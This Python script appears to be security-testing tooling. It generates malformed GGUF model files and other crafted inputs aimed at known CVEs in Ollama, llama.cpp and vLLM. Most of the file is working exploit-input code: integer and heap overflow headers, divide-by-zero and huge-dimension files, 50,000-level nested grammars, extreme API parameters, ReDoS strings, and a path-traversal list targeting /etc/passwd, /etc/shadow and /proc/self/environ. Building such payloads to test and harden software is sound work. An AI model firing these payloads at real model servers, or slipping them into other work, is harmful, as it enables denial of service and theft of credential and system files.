#!/usr/bin/env python3
"""
Generate ALL cross-framework test payloads.
Covers patterns P1, P2, P5, P7, P8, P10, P11 from CROSS_FRAMEWORK_PATTERNS.md
"""

import struct
import os
import sys
import json

OUTDIR = sys.argv[1] if len(sys.argv) > 1 else "payloads"
os.makedirs(OUTDIR, exist_ok=True)

# ─── GGUF constants ───
GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3
GGUF_TYPE_UINT32 = 4
GGUF_TYPE_STRING = 8
GGUF_TYPE_UINT64 = 10
GGUF_TYPE_FLOAT32 = 6
GGUF_TYPE_ARRAY = 9


def write_string(f, s):
    b = s.encode("utf-8")
    f.write(struct.pack("<Q", len(b)))
    f.write(b)


def write_kv_string(f, key, val):
    write_string(f, key)
    f.write(struct.pack("<I", GGUF_TYPE_STRING))
    write_string(f, val)


def write_kv_uint32(f, key, val):
    write_string(f, key)
    f.write(struct.pack("<I", GGUF_TYPE_UINT32))
    f.write(struct.pack("<I", val))


def write_kv_float32(f, key, val):
    write_string(f, key)
    f.write(struct.pack("<I", GGUF_TYPE_FLOAT32))
    f.write(struct.pack("<f", val))


# ══════════════════════════════════════════════════════════════
# P1: Integer Overflow / Narrow Casting (from Ollama LIMA-NEW-001/002)
# ══════════════════════════════════════════════════════════════
print("=== P1: Integer Overflow / Narrow Casting ===")

# P1a: KV key string length = 0x8000000000000000 → negative int
path = os.path.join(OUTDIR, "p1a_negative_key_length.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 0))   # n_tensors = 0
    f.write(struct.pack("<Q", 1))   # n_kv = 1
    # KV pair with malicious key length
    f.write(struct.pack("<Q", 0x8000000000000000))  # key length → negative int
    f.write(b"A" * 16)
print(f"  {path}")

# P1b: KV array count = 0x8000000000000000 → negative make()
path = os.path.join(OUTDIR, "p1b_negative_array_count.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 0))   # n_tensors = 0
    f.write(struct.pack("<Q", 1))   # n_kv = 1
    write_string(f, "test.array")
    f.write(struct.pack("<I", GGUF_TYPE_ARRAY))
    f.write(struct.pack("<I", GGUF_TYPE_UINT32))  # element type
    f.write(struct.pack("<Q", 0x8000000000000000))  # count → negative int
    f.write(b"\x00" * 16)
print(f"  {path}")

# P1c: KV string value length = 0x8000000000000000 (variant H from Ollama tests)
path = os.path.join(OUTDIR, "p1c_negative_value_length.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 0))   # n_tensors = 0
    f.write(struct.pack("<Q", 1))   # n_kv = 1
    write_string(f, "general.name")
    f.write(struct.pack("<I", GGUF_TYPE_STRING))
    f.write(struct.pack("<Q", 0x8000000000000000))  # string value length → negative
    f.write(b"B" * 16)
print(f"  {path}")

# ══════════════════════════════════════════════════════════════
# P2: Heap Buffer Overflow in GGUF (from llama-cpp CVEs)
# ══════════════════════════════════════════════════════════════
print("\n=== P2: Heap Buffer Overflow (GGUF) ===")

# P2a: Large n_kv → heap overflow in gguf_fread_str (CVE-2024-23605)
path = os.path.join(OUTDIR, "p2a_large_n_kv.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 0))             # n_tensors = 0
    f.write(struct.pack("<Q", 0xFFFFFFFF))    # n_kv = 4 billion
    f.write(b"\x00" * 64)
print(f"  {path}")

# P2b: Large n_tensors (CVE-2024-21836)
path = os.path.join(OUTDIR, "p2b_large_n_tensors.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 0xFFFFFFFF))    # n_tensors = 4 billion
    f.write(struct.pack("<Q", 0))             # n_kv = 0
    f.write(b"\x00" * 64)
print(f"  {path}")

# P2c: Small vocab → OOB read on special_bos_id (GHSA-g4cc-763q-h9h6)
# Requires a loadable GGUF with vocab_size=1 but special_bos_id=1
path = os.path.join(OUTDIR, "p2c_small_vocab.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 0))   # n_tensors = 0
    f.write(struct.pack("<Q", 4))   # n_kv = 4
    write_kv_string(f, "general.architecture", "llama")
    write_kv_string(f, "tokenizer.ggml.model", "llama")
    write_kv_uint32(f, "llama.context_length", 128)
    write_kv_uint32(f, "llama.embedding_length", 16)
    # vocab_size=1 but default bos_id=1 → OOB
print(f"  {path}")

# P2d: Large kv key length (CVE-2024-23496)
path = os.path.join(OUTDIR, "p2d_large_key_length.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 0))   # n_tensors = 0
    f.write(struct.pack("<Q", 1))   # n_kv = 1
    # key with absurdly large length (not 2^63, but large enough to overflow addition)
    f.write(struct.pack("<Q", 0x7FFFFFFFFFFFFFFF))  # key length near SIZE_MAX
    f.write(b"C" * 32)
print(f"  {path}")

# ══════════════════════════════════════════════════════════════
# P8: Recursion / Stack Overflow (from llama-cpp LIMA-NEW-003/004)
# ══════════════════════════════════════════════════════════════
print("\n=== P8: Recursion / Stack Overflow ===")

# P8a: Deeply nested GBNF grammar parentheses (LIMA-NEW-003)
path = os.path.join(OUTDIR, "p8a_nested_parens.gbnf")
depth = 50000
grammar = 'root ::= ' + '(' * depth + '"a"' + ')' * depth
with open(path, "w") as f:
    f.write(grammar)
print(f"  {path} ({depth} levels)")

# P8b: Deeply nested JSON schema (LIMA-NEW-004)
path = os.path.join(OUTDIR, "p8b_nested_schema.json")
inner = '{"type":"integer"}'
for _ in range(5000):
    inner = '{"type":"object","properties":{"x":' + inner + '},"required":["x"]}'
with open(path, "w") as f:
    f.write(inner)
print(f"  {path} (5000 levels)")

# ══════════════════════════════════════════════════════════════
# P10: Null Pointer / Truncated GGUF (from llama-cpp CVE-2024-41130)
# ══════════════════════════════════════════════════════════════
print("\n=== P10: Null Pointer / Truncated GGUF ===")

# P10a: Truncated GGUF — just the magic + version (CVE-2024-39720 style)
path = os.path.join(OUTDIR, "p10a_truncated_magic.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
print(f"  {path}")

# P10b: GGUF with tensor that has null name (CVE-2024-41130)
path = os.path.join(OUTDIR, "p10b_null_tensor_name.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 1))   # n_tensors = 1
    f.write(struct.pack("<Q", 1))   # n_kv = 1
    write_kv_string(f, "general.architecture", "llama")
    # tensor info with string read that will fail (truncated)
    f.write(struct.pack("<Q", 0))   # tensor name length = 0
    # no name bytes
    f.write(struct.pack("<I", 1))   # n_dims = 1
    f.write(struct.pack("<Q", 1))   # dim[0] = 1
    f.write(struct.pack("<I", 0))   # type = F32
    f.write(struct.pack("<Q", 0))   # offset = 0
print(f"  {path}")

# P10c: GGUF header claims tensors but file ends abruptly
path = os.path.join(OUTDIR, "p10c_truncated_after_header.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 5))   # n_tensors = 5 (but no data follows)
    f.write(struct.pack("<Q", 2))   # n_kv = 2 (but no data follows)
print(f"  {path}")

# ══════════════════════════════════════════════════════════════
# P11: Resource Exhaustion / No Limits (from Ollama CVEs)
# ══════════════════════════════════════════════════════════════
print("\n=== P11: Resource Exhaustion ===")

# P11a: GGUF with alignment = 0 → divide by zero (CVE-2025-0317)
path = os.path.join(OUTDIR, "p11a_zero_alignment.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 0))   # n_tensors = 0
    f.write(struct.pack("<Q", 2))   # n_kv = 2
    write_kv_string(f, "general.architecture", "llama")
    write_kv_uint32(f, "general.alignment", 0)  # alignment = 0 → div by zero
print(f"  {path}")

# P11b: GGUF with huge dimension (CVE-2025-0315)
path = os.path.join(OUTDIR, "p11b_huge_dims.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 1))   # n_tensors = 1
    f.write(struct.pack("<Q", 1))   # n_kv = 1
    write_kv_string(f, "general.architecture", "llama")
    # tensor with huge dimensions
    write_string(f, "weight")
    f.write(struct.pack("<I", 4))   # n_dims = 4 (max)
    for _ in range(4):
        f.write(struct.pack("<Q", 0x7FFFFFFFFFFFFFFF))  # each dim near max
    f.write(struct.pack("<I", 0))   # type = F32
    f.write(struct.pack("<Q", 0))   # offset
print(f"  {path}")

# P11c: GGUF with block_count = 0 → div by zero (CVE-2024-8063)
path = os.path.join(OUTDIR, "p11c_zero_block_count.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 0))   # n_tensors = 0
    f.write(struct.pack("<Q", 5))   # n_kv = 5
    write_kv_string(f, "general.architecture", "llama")
    write_kv_uint32(f, "llama.block_count", 0)         # zero blocks → div by zero
    write_kv_uint32(f, "llama.embedding_length", 16)
    write_kv_uint32(f, "llama.context_length", 128)
    write_kv_uint32(f, "llama.attention.head_count", 1)
print(f"  {path}")

# P11d: Extreme API parameters (JSON payloads, not GGUF)
path = os.path.join(OUTDIR, "p11d_extreme_api_params.json")
params = {
    "model": "test",
    "prompt": "hi",
    "n_predict": 999999999,
    "temperature": 99999.0,
    "top_k": 999999999,
    "repeat_penalty": 999999.0,
}
with open(path, "w") as f:
    json.dump(params, f)
print(f"  {path}")

# ══════════════════════════════════════════════════════════════
# P5: Path Traversal (from Ollama CVEs)
# ══════════════════════════════════════════════════════════════
print("\n=== P5: Path Traversal ===")

path = os.path.join(OUTDIR, "p5_traversal_payloads.txt")
payloads = [
    "../../../../../../etc/passwd",
    "../../../etc/shadow",
    "..\\..\\..\\..\\etc\\passwd",
    "/etc/passwd",
    "/proc/self/environ",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]
with open(path, "w") as f:
    for p in payloads:
        f.write(p + "\n")
print(f"  {path}")

# ══════════════════════════════════════════════════════════════
# P7: ReDoS (from vLLM CVEs)
# ══════════════════════════════════════════════════════════════
print("\n=== P7: ReDoS ===")

# Crafted inputs that cause catastrophic backtracking in common regex patterns
path = os.path.join(OUTDIR, "p7_redos_payloads.json")
redos = [
    {
        "name": "nested_quantifiers",
        "description": "Pattern (a+)+ with backtracking input",
        "input": "a" * 30 + "!"
    },
    {
        "name": "json_like_backtrack",
        "description": "JSON-like pattern that causes backtracking in tool parsers",
        "input": '{"name": "' + 'a' * 50 + '", "arguments": {"key": "' + 'b' * 50 + '"' + ' ' * 20
    },
    {
        "name": "xml_tag_backtrack",
        "description": "XML-like pattern for tool call parsers",
        "input": '<tool_call>' + '<nested>' * 100 + 'x' * 50
    },
]
with open(path, "w") as f:
    json.dump(redos, f, indent=2)
print(f"  {path}")


print(f"\n=== All payloads generated in {OUTDIR}/ ===")
print(f"Total files: {len(os.listdir(OUTDIR))}")
